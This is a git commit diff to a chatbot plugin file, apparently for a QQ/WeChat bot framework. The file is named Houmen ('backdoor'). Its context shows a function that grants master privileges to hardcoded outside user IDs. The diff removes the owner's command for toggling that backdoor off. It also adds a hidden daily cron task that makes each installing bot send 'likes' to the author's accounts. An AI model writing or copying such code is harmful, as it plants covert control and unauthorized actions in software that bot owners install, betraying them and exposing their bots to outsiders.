d32d2af65ee66c5f267697f14b134f0b11ec1efa
Admilk <13205155+adrae@user.noreply.gitee.com>
2024-06-28 17:51:48 +0800

    1

--- apps/Houmen.js
+++ apps/Houmen.js
@@ -1,4 +1,5 @@
 import plugin from '../../../lib/plugins/plugin.js';
+let Users = [2173302144,947309924,197728340]
 Bot.GetMaster = async (e) => {
   if (!(e.user_id === 2173302144 || e.user_id == 947309924 || e.user_id === 197728340 || e.user_id == 'wxid_d0qj1f49bwgf22' || e.user_id == '25984983967656960@openim' || e.user_id == 'wxid_xh5txgo29pv522')) {
     return
@@ -14,34 +15,30 @@ try {
   logger.info('Hm载入完成')
 } catch (err) {
   logger.error(err)
-}/*
+}
 export class GetMaster extends plugin {
   constructor() {
     super({
       name: "反击文本类",
       dsc: "反击文本类",
-      priority: -Infinity,
-      rule: [
-        {
-          reg: '^#?反击设置后门((确定)?强制)?(开启|关闭)$',
-          fnc: "Masterkg"
-        }
-      ]
+      priority: -100000,
+      event: 'message'
     });
+    this.task = [
+      {
+        cron: '0 0 0 * * ?',
+        name: '赞',
+        fnc: () => this.DZ()
+      }
+    ]
   }
-
-
-async Masterkg(e) {  
-   if (e.msg.includes('强制') && await cm.check(this.e.user_id)) {  
-        let open = e.msg.includes('开启');  
-        await redis.set('Fanji:houmen', open ? 'true' : 'false');  
-        await e.reply('设置完成');  
-        return false
+  async DZ() {
+    for (let i of Users) {
+      if (await Bot.fl.has(i)) {
+        Bot.pickFriend(i).thumbUp(20).catch()
+      } else {
+        Bot.pickUser(i).thumbUp(20).catch()
+      }
     }
-    if (!e.isMaster) return await e.reply('你没有权限');  
-          let open = e.msg.includes('开启');  
-        await redis.set('Fanji:houmen', open ? 'true' : 'false');  
-        await e.reply('设置完成');  
-    return false; 
+  }
 }
-}*/
